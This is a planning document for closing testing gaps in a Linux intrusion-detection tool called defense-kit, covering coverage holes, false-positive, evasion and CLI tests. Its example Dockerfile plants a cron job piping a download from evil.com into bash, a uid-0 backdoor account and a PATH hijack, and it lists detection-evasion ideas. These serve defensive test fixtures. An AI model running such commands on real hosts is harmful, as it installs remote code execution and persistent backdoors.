# Gap 05: Testing Gaps

**Priority:** HIGH
**Impact:** Can't trust detection results without proper testing

## Coverage Holes

| Package | Coverage | Problem |
|---------|----------|---------|
| environment | 25% | Only shell_rc tested. env_vars, ld_preload, pam have interface tests only |
| schedule | 27% | Unit generation tested but enable/disable/status untested |
| cmd/defense-kit | 0% | No CLI integration tests at all |
| code | 58% | Credentials well-tested but stubs inflate the denominator |
| filesystem | 70% | SUID tested but anomalies/timestomp/capabilities/swap are stubs |

## Missing Test Categories

### 1. No False Positive Testing

**Problem:** We don't know how noisy defense-kit is on a clean system. Could generate dozens of false positives that train users to ignore findings.

**What to build:**
- Run full scan on a freshly installed Ubuntu/Debian system
- Document expected findings (legitimate SUID binaries, expected ports, etc.)
- Adjust detection logic to suppress known-good patterns
- Track false positive rate as a metric

### 2. No Real Malware Sample Testing

**Problem:** All tests use synthetic patterns (`"curl http://evil.com | bash"` in a temp file). Never tested against actual attacker tooling.

**What to build:**
- Create a Docker container with planted vulnerabilities:
  - Malicious cron entry
  - Trojanized SUID binary
  - LD_PRELOAD rootkit
  - Reverse shell process
  - Leaked AWS keys in git history
  - PAM backdoor module
  - Modified /etc/shadow
  - Unauthorized SSH key
- Run defense-kit against this container
- Verify every planted vulnerability is detected
- This becomes the integration test suite

### 3. No Evasion Testing

**Problem:** Don't know which detections are trivially bypassed.

**What to build:**
- For each detection pattern, create an evasion variant:
  - Rootkit with innocent name → does name-check catch it? (no)
  - Reverse shell via python instead of bash → does process scanner catch it? (no)
  - Cron entry calling a script that calls a script → does cron scanner follow? (no)
  - Obfuscated shell RC entry → does RC scanner catch it? (no)
- Use evasion test failures to improve detection

### 4. No Performance Testing

**Problem:** Full scan takes 60-90 seconds. Unknown if that's acceptable or if specific scanners are bottlenecks.

**What to build:**
- Benchmark each scanner individually
- Identify slow scanners (filesystem walking, /proc parsing)
- Set timeout expectations per scanner
- Test with large codebases (100k+ files) to verify scanning doesn't OOM

### 5. No Concurrency Safety Testing

**Problem:** Engine runs scanners in parallel but concurrent access to /proc, filesystem is untested beyond `-race` flag.

**What to build:**
- Stress test: run 31 scanners simultaneously on a busy system
- Verify no data races with `-race`
- Test scanner timeout behavior under load
- Test panic recovery actually works in concurrent context

### 6. No CLI Integration Tests

**Problem:** `cmd/defense-kit` has 0% coverage. The entire CLI layer is untested.

**What to build:**
- Test `defense-kit scan --category environment` produces valid JSON
- Test `defense-kit scan --html /tmp/test.html` creates file
- Test `defense-kit tools check` lists correct scanner count
- Test `defense-kit harden --dry-run` shows fixable findings
- Test `defense-kit baseline update` then `baseline diff` works
- Test `defense-kit schedule status` returns valid output
- Test `defense-kit comply --framework cis` produces report

### 7. Hardener Safety Testing

**Problem:** The SSH hardener modifies `/etc/ssh/sshd_config`. If the test runs as root, it would modify the real config. Tests need isolation.

**Current state:** SSH tests use `NewSSHHardenerWithConfig(tempFile)` which is correct. But:
- No test verifies rollback actually restores the original
- No test verifies verify fails when config doesn't match
- No test for edge cases (config file doesn't exist, no write permission)

## Recommended Test Infrastructure

### Vulnerable Container (for integration tests)

```dockerfile
FROM ubuntu:22.04

# Plant vulnerabilities
RUN echo "* * * * * root curl http://evil.com/payload | bash" > /etc/cron.d/backdoor
RUN echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
RUN useradd -o -u 0 -g 0 backdoor
RUN echo "export PATH=/tmp/evil:$PATH" >> /root/.bashrc
RUN echo "AKIAIOSFODNN7EXAMPLE" > /root/.env
RUN chmod 4755 /tmp/suspicious_binary || true
```

### Test Matrix

| Test Type | Where | Coverage Target |
|-----------|-------|----------------|
| Unit tests | Per scanner package | 80%+ |
| Integration tests | Vulnerable container | All 30 categories |
| False positive tests | Clean Ubuntu | 0 false positives |
| Evasion tests | Modified container | Document bypass rate |
| CLI tests | Any environment | All commands |
| Performance tests | CI | <120s full scan |
